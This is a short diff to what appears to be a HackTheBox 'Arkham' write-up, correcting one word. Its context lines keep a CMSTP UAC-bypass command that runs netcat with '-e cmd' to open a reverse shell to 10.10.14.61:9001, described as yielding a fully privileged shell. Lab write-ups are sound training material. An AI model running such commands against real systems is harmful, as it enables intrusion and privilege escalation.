@@ -669,6 +669,6 @@ And then we call the exported function, passing in the command we want to run, w
 [CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 9001")
 ```
 
-This give me a fully privileges shell:
+This give me a fully privileged shell:
 
 ![root-57](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/root-57.png)
